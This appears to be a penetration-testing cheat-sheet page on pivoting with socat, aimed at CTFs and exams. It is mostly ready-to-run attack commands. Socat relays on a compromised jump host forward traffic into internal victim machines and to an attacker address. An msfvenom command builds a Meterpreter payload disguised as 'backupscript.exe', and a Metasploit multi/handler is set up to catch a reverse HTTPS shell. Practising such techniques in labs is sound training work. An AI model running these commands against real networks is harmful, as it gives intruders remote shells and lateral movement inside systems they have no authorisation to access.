---
description: >-
  Socat is a easy tool to use when you want to port forward. It's a
  bidirectional relay tool that can create pipe sockets between 2 independent
  byte streams and transfer data between them.
---

# Socat

## **Starting Socat Bind Shell Listener (From Jump host)**

**These are three ways of achieving the same result.**&#x20;

```shell-session
victim@jump-host$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

<pre class="language-shell-session"><code class="lang-shell-session"><strong>victim@jump-host$ socat -ddd TCP-LISTEN:2345,fork TCP:&#x3C;next_victim_ip>:5432
</strong></code></pre>

```shell-session
victim@jump-host$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

`172.16.5.19` & `next_victim_ip` are computers within the victim network.&#x20;

`8080` & `2345` is a port number we've decided to choose to use.

`8443` & `5432` is the port number of the service we're trying to connect to. (Web server & PostgreSQL)





## Metasploit can be useful for transferring binaries to a victim:

[_<mark style="color:red;">**NOTE:**</mark>_](#user-content-fn-1)[^1] This is obviously not practical in real world scenarios as metasploit is highly signatured and will be dropped by AV. However, for CTF's & Exams this can be a quick and useful way of achieving what you want.

**Creating the Windows Payload (Delivered to Windows host)**

_**LHOST:**_ Jump host IP address

```shell-session
attacker@attack-host$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

**Configuring & Starting the multi/handler (on Attack host)**

```shell-session
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```





[^1]: 
